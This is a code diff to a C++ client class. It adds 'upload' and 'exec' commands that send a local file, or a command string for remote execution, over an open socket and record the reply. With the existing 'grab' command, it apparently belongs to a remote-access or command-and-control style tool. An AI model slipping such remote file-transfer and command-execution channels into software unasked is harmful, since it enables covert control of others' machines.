@@ -213,6 +213,12 @@ public: // Making everything public temporarily
         else if(cmd.substr(0, 5) == "grab "){
             this->grab(cmd.substr(5));
         }
+        else if(cmd.substr(0, 7) == "upload "){
+            this->upload(cmd.substr(7));
+        }
+        else if(cmd.substr(0, 5) == "exec "){
+            this->exec(cmd.substr(5));
+        }
         else{
             this->plainTextMessageHistory.push_back("Unknown command: " + cmd);
         }
@@ -355,6 +361,56 @@ public: // Making everything public temporarily
         of.write(fileData.data(), fileData.size());
         of.close();
         this->plainTextMessageHistory.push_back("File written to disk at ./" + path);
+        this->sockFdMutex.unlock();
+    }
+
+    void upload(std::string path){
+        std::ifstream f(path, std::ios::binary);
+        if(f.is_open() != true){
+            this->plainTextMessageHistory.push_back("ERR: File not found");
+        }else{
+            this->sockFdMutex.lock();
+            std::string header = "upload;" + std::filesystem::path(path).filename().string() + ";" + std::to_string(std::filesystem::file_size(path)) + ";";
+            std::vector<char> uploadData;
+            uploadData.reserve(header.size() + std::filesystem::file_size(path));
+            uploadData.insert(uploadData.end(), header.begin(), header.end());
+            uploadData.insert(uploadData.end(), std::istreambuf_iterator<char>(f), std::istreambuf_iterator<char>());
+            f.close();
+            int bytesSent = send(this->sockFd, uploadData.data(), uploadData.size(), 0);
+            if(bytesSent < 0){
+                this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent));
+                this->sockFdMutex.unlock();
+                return;
+            }
+            this->plainTextMessageHistory.push_back("Sent " + std::to_string(bytesSent) + " bytes of data, waiting for response");
+            char responseBuffer[32] = {0};
+            int bytesReceived = recv(this->sockFd, responseBuffer, 32, 0);
+            if(bytesReceived < 0){
+                this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
+                this->sockFdMutex.unlock();
+                return;
+            }
+            this->plainTextMessageHistory.push_back("Response: " + std::string(responseBuffer));
+            this->sockFdMutex.unlock();
+        }
+    }
+
+    void exec(std::string cmd){
+        this->sockFdMutex.lock();
+        int bytesSent = send(this->sockFd, ("exec;" + cmd + ";").c_str(), cmd.length() + 6, 0);
+        if(bytesSent < 0){
+            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent));
+            this->sockFdMutex.unlock();
+            return;
+        }
+        char responseBuffer[4096] = {0}; // This is a stupid hard limit for now
+        int bytesReceived = recv(this->sockFd, responseBuffer, 4096, 0);
+        if(bytesReceived < 0){
+            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
+            this->sockFdMutex.unlock();
+            return;
+        }
+        this->plainTextMessageHistory.push_back("Response: " + std::string(responseBuffer));
         this->sockFdMutex.unlock();
     }
 
